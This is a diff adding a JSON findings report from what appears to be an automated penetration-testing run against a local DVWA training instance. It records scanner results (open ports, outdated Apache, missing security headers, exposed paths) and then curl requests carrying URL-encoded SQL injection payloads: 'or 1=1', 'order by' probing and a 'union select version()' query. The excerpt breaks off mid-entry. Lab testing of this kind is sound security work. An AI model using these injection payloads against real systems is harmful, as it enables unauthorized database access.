@@ -1,0 +1,2563 @@
+{
+  "run_id": "75044ba831054fa197df1cd10530614c",
+  "generated_at": "2026-10-20T15:37:25+00:00",
+  "target": "172.28.0.2",
+  "phase_history": [
+    {
+      "timestamp": "2026-10-19T17:14:33+00:00",
+      "phase": "recon"
+    },
+    {
+      "timestamp": "2026-10-19T17:14:59+00:00",
+      "phase": "enumeration"
+    },
+    {
+      "timestamp": "2026-10-19T17:15:27+00:00",
+      "phase": "vulnerability-discovery"
+    },
+    {
+      "timestamp": "2026-10-19T17:16:14+00:00",
+      "phase": "exploitation"
+    }
+  ],
+  "findings": [
+    {
+      "id": "open-port:172.28.0.2:80/tcp",
+      "cause_class": "open-port",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 21,
+      "evidence": [
+        {
+          "timestamp": "17:14:41",
+          "tool": "nmap",
+          "exit_signal": "80/tcp http",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "80/tcp"
+    },
+    {
+      "id": "waf-absent:172.28.0.2:no-waf-detected",
+      "cause_class": "waf-absent",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:15:12",
+          "tool": "wafw00f",
+          "exit_signal": "no-waf-detected",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "no-waf-detected"
+    },
+    {
+      "id": "exposed-path:172.28.0.2:/docs (301)",
+      "cause_class": "exposed-path",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:15:45",
+          "tool": "gobuster",
+          "exit_signal": "/docs (301)",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "/docs (301)"
+    },
+    {
+      "id": "exposed-path:172.28.0.2:/robots.txt (200)",
+      "cause_class": "exposed-path",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:15:45",
+          "tool": "gobuster",
+          "exit_signal": "/robots.txt (200)",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "/robots.txt (200)"
+    },
+    {
+      "id": "exposed-path:172.28.0.2:/config (301)",
+      "cause_class": "exposed-path",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:15:45",
+          "tool": "gobuster",
+          "exit_signal": "/config (301)",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "/config (301)"
+    },
+    {
+      "id": "exposed-path:172.28.0.2:/phpinfo.php (302)",
+      "cause_class": "exposed-path",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:15:45",
+          "tool": "gobuster",
+          "exit_signal": "/phpinfo.php (302)",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "/phpinfo.php (302)"
+    },
+    {
+      "id": "exposed-path:172.28.0.2:/setup.php (200)",
+      "cause_class": "exposed-path",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:15:45",
+          "tool": "gobuster",
+          "exit_signal": "/setup.php (200)",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "/setup.php (200)"
+    },
+    {
+      "id": "info-endpoint:172.28.0.2/phpinfo.php:/admin",
+      "cause_class": "info-endpoint",
+      "target": "172.28.0.2/phpinfo.php",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:16:36",
+          "tool": "curl",
+          "exit_signal": "An informational endpoint was discovered.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "/admin"
+    },
+    {
+      "id": "info-endpoint:172.28.0.2/phpinfo.php:/status",
+      "cause_class": "info-endpoint",
+      "target": "172.28.0.2/phpinfo.php",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:16:36",
+          "tool": "curl",
+          "exit_signal": "An informational endpoint was discovered.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "/status"
+    },
+    {
+      "id": "info-header:172.28.0.2/login.php:X-Powered-By",
+      "cause_class": "info-header",
+      "target": "172.28.0.2/login.php",
+      "generality": 0.10714285714285714,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:18:20",
+          "tool": "curl",
+          "exit_signal": "Information disclosure via X-Powered-By header.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "X-Powered-By"
+    },
+    {
+      "id": "info-header:172.28.0.2/login.php:Server",
+      "cause_class": "info-header",
+      "target": "172.28.0.2/login.php",
+      "generality": 0.10714285714285714,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:18:20",
+          "tool": "curl",
+          "exit_signal": "Server software version is disclosed.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "Server"
+    },
+    {
+      "id": "curl:172.28.0.2/admin:cd8c09f03e82",
+      "cause_class": "curl",
+      "target": "172.28.0.2/admin",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:19:08",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "cd8c09f03e82"
+    },
+    {
+      "id": "server-banner:172.28.0.2:Apache/2.4.25 (Debian)",
+      "cause_class": "server-banner",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:20:03",
+          "tool": "nikto",
+          "exit_signal": "Server: Apache/2.4.25 (Debian)",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "Apache/2.4.25 (Debian)"
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[600050] Apache/2.4.25 appears to be outdated (current is at least 2.4.68).",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:20:03",
+          "tool": "nikto",
+          "exit_signal": "[600050] Apache/2.4.25 appears to be outdated (current is at least 2.4.68).",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[600050] Apache/2.4.25 appears to be outdated (current is at least 2.4.68)."
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:20:03",
+          "tool": "nikto",
+          "exit_signal": "[013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy"
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Securi",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:20:03",
+          "tool": "nikto",
+          "exit_signal": "[013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Securi",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Securi"
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:20:03",
+          "tool": "nikto",
+          "exit_signal": "[013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:20:03",
+          "tool": "nikto",
+          "exit_signal": "[013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy"
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:20:03",
+          "tool": "nikto",
+          "exit_signal": "[013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[750500] /config/: Directory indexing found. See: CWE-548",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:20:03",
+          "tool": "nikto",
+          "exit_signal": "[750500] /config/: Directory indexing found. See: CWE-548",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[750500] /config/: Directory indexing found. See: CWE-548"
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[000998] /config/: Configuration information may be available remotely.",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:20:03",
+          "tool": "nikto",
+          "exit_signal": "[000998] /config/: Configuration information may be available remotely.",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[000998] /config/: Configuration information may be available remotely."
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[750500] /docs/: Directory indexing found. See: CWE-548",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:20:03",
+          "tool": "nikto",
+          "exit_signal": "[750500] /docs/: Directory indexing found. See: CWE-548",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[750500] /docs/: Directory indexing found. See: CWE-548"
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[003584] /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:20:03",
+          "tool": "nikto",
+          "exit_signal": "[003584] /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[003584] /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/"
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[006333] /login.php: Admin login page/section found.",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:20:03",
+          "tool": "nikto",
+          "exit_signal": "[006333] /login.php: Admin login page/section found.",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[006333] /login.php: Admin login page/section found."
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[007224] /.gitignore: .gitignore file found. It is possible to grasp the directory structure.",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:20:03",
+          "tool": "nikto",
+          "exit_signal": "[007224] /.gitignore: .gitignore file found. It is possible to grasp the directory structure.",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[007224] /.gitignore: .gitignore file found. It is possible to grasp the directory structure."
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[007342] /: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors directive. See: https://",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:20:03",
+          "tool": "nikto",
+          "exit_signal": "[007342] /: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors directive. See: https://",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[007342] /: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors directive. See: https://"
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[007352] /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME t",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.2",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:20:03",
+          "tool": "nikto",
+          "exit_signal": "[007352] /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME t",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[007352] /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME t"
+    },
+    {
+      "id": "outdated-server-header:172.28.0.2/etc/passwd:Apache/2.4.25 (Debian)",
+      "cause_class": "outdated-server-header",
+      "target": "172.28.0.2/etc/passwd",
+      "generality": 0.14285714285714285,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:23:28",
+          "tool": "curl",
+          "exit_signal": "The server is running a specific version of Apache.",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "Apache/2.4.25 (Debian)"
+    },
+    {
+      "id": "outdated-server-header:172.28.0.2/instructions.php:DVWA v1.10",
+      "cause_class": "outdated-server-header",
+      "target": "172.28.0.2/instructions.php",
+      "generality": 0.14285714285714285,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:30:34",
+          "tool": "curl",
+          "exit_signal": "The application is running a known vulnerable version.",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "DVWA v1.10"
+    },
+    {
+      "id": "application-info-disclosure:172.28.0.2/instructions.php:DVWA",
+      "cause_class": "application-info-disclosure",
+      "target": "172.28.0.2/instructions.php",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:30:34",
+          "tool": "curl",
+          "exit_signal": "The application explicitly states it is vulnerable.",
+          "tier": "T3"
+        },
+        {
+          "timestamp": "17:30:34",
+          "tool": "curl",
+          "exit_signal": "The application warns users about its inherent vulnerability.",
+          "tier": "T3"
+        },
+        {
+          "timestamp": "17:30:34",
+          "tool": "curl",
+          "exit_signal": "The application discloses its licensing information.",
+          "tier": "T3"
+        },
+        {
+          "timestamp": "17:30:34",
+          "tool": "curl",
+          "exit_signal": "The application lists an older stable version.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "DVWA"
+    },
+    {
+      "id": "application-info-disclosure:172.28.0.2/instructions.php:DVWA v1.0.7",
+      "cause_class": "application-info-disclosure",
+      "target": "172.28.0.2/instructions.php",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:30:34",
+          "tool": "curl",
+          "exit_signal": "The application lists an older live CD version.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "DVWA v1.0.7"
+    },
+    {
+      "id": "outdated-server-header:172.28.0.2/login.php:Apache/2.4.25 (Debian)",
+      "cause_class": "outdated-server-header",
+      "target": "172.28.0.2/login.php",
+      "generality": 0.14285714285714285,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:31:46",
+          "tool": "curl",
+          "exit_signal": "The server is running a potentially outdated Apache version.",
+          "tier": "T2"
+        },
+        {
+          "timestamp": "17:42:33",
+          "tool": "curl",
+          "exit_signal": "The server is running a potentially outdated Apache version.",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "Apache/2.4.25 (Debian)"
+    },
+    {
+      "id": "redirect-status:172.28.0.2/login.php:302 Found",
+      "cause_class": "redirect-status",
+      "target": "172.28.0.2/login.php",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:31:46",
+          "tool": "curl",
+          "exit_signal": "The initial request resulted in a redirection.",
+          "tier": "T3"
+        },
+        {
+          "timestamp": "17:42:33",
+          "tool": "curl",
+          "exit_signal": "The initial request resulted in a redirection.",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "302 Found"
+    },
+    {
+      "id": "cookie-security:172.28.0.2/login.php:security=low",
+      "cause_class": "cookie-security",
+      "target": "172.28.0.2/login.php",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:31:46",
+          "tool": "curl",
+          "exit_signal": "A cookie was set with a low security designation.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "security=low"
+    },
+    {
+      "id": "cookie-path:172.28.0.2/login.php:/",
+      "cause_class": "cookie-path",
+      "target": "172.28.0.2/login.php",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 3,
+      "evidence": [
+        {
+          "timestamp": "17:31:46",
+          "tool": "curl",
+          "exit_signal": "A session cookie is set for the entire site path.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "/"
+    },
+    {
+      "id": "cookie-security-header:172.28.0.2/login.php:security=low",
+      "cause_class": "cookie-security-header",
+      "target": "172.28.0.2/login.php",
+      "generality": 0.03571428571428571,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:42:33",
+          "tool": "curl",
+          "exit_signal": "The session cookie is marked with a low security setting.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "security=low"
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:X-Powered-By: PHP/7.4",
+      "cause_class": "info-header",
+      "target": "172.28.0.2/index.php",
+      "generality": 0.10714285714285714,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:43:38",
+          "tool": "curl",
+          "exit_signal": "The server reveals its PHP version.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "X-Powered-By: PHP/7.4"
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:Server: nginx/1.18.0",
+      "cause_class": "info-header",
+      "target": "172.28.0.2/index.php",
+      "generality": 0.10714285714285714,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:43:38",
+          "tool": "curl",
+          "exit_signal": "The server reveals its Nginx version.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "Server: nginx/1.18.0"
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:X-Frame-Options: SAMEORIGIN",
+      "cause_class": "info-header",
+      "target": "172.28.0.2/index.php",
+      "generality": 0.10714285714285714,
+      "state": "resolved",
+      "downstream": 1,
+      "evidence": [
+        {
+          "timestamp": "17:43:38",
+          "tool": "curl",
+          "exit_signal": "The site implements a frame-busting policy.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "X-Frame-Options: SAMEORIGIN"
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:Strict-Transport-Security",
+      "cause_class": "info-header",
+      "target": "172.28.0.2/index.php",
+      "generality": 0.10714285714285714,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:43:38",
+          "tool": "curl",
+          "exit_signal": "The site enforces HSTS.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "Strict-Transport-Security"
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:Content-Security-Policy",
+      "cause_class": "info-header",
+      "target": "172.28.0.2/index.php",
+      "generality": 0.10714285714285714,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:43:38",
+          "tool": "curl",
+          "exit_signal": "The site implements CSP.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "Content-Security-Policy"
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:X-Content-Type-Options: nosniff",
+      "cause_class": "info-header",
+      "target": "172.28.0.2/index.php",
+      "generality": 0.10714285714285714,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:43:38",
+          "tool": "curl",
+          "exit_signal": "The site prevents MIME type sniffing.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "X-Content-Type-Options: nosniff"
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:X-Custom-Header",
+      "cause_class": "info-header",
+      "target": "172.28.0.2/index.php",
+      "generality": 0.10714285714285714,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:43:38",
+          "tool": "curl",
+          "exit_signal": "A custom header is present.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "X-Custom-Header"
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:Missing-Header",
+      "cause_class": "info-header",
+      "target": "172.28.0.2/index.php",
+      "generality": 0.10714285714285714,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:43:38",
+          "tool": "curl",
+          "exit_signal": "A security header is missing.",
+          "tier": "T3"
+        },
+        {
+          "timestamp": "17:43:38",
+          "tool": "curl",
+          "exit_signal": "A security header is missing.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "Missing-Header"
+    },
+    {
+      "id": "curl:172.28.0.2/index.php:469bb09c76b0",
+      "cause_class": "curl",
+      "target": "172.28.0.2/index.php",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:44:34",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "469bb09c76b0"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli:3828861d24c4",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 1,
+      "evidence": [
+        {
+          "timestamp": "17:49:01",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "3828861d24c4"
+    },
+    {
+      "id": "outdated-server-header:172.28.0.2/security.php:Apache/2.4.25 (Debian)",
+      "cause_class": "outdated-server-header",
+      "target": "172.28.0.2/security.php",
+      "generality": 0.14285714285714285,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:49:40",
+          "tool": "curl",
+          "exit_signal": "The server is running a potentially outdated Apache version.",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "Apache/2.4.25 (Debian)"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli:99eec3a1ddb5",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:52:12",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "99eec3a1ddb5"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?user_token=a7299c249dd674cf4cdc275e554efe01\":d149a9f16263",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?user_token=a7299c249dd674cf4cdc275e554efe01\"",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:54:16",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "d149a9f16263"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27+or+%271%27=%271&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:116547b48cbe",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27+or+%271%27=%271&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:58:01",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "116547b48cbe"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%20order%20by%203--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:54915392e9ae",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%20order%20by%203--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "18:03:10",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "54915392e9ae"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20order%20by%203--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:48de91f37473",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20order%20by%203--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "18:04:41",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "48de91f37473"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20order%20by%204--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:48de91f37473",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20order%20by%204--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "18:05:38",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "48de91f37473"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%20union%20select%201,%20version(),3--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:cdf6f1cd28e9",
+      "cause_class": "curl",
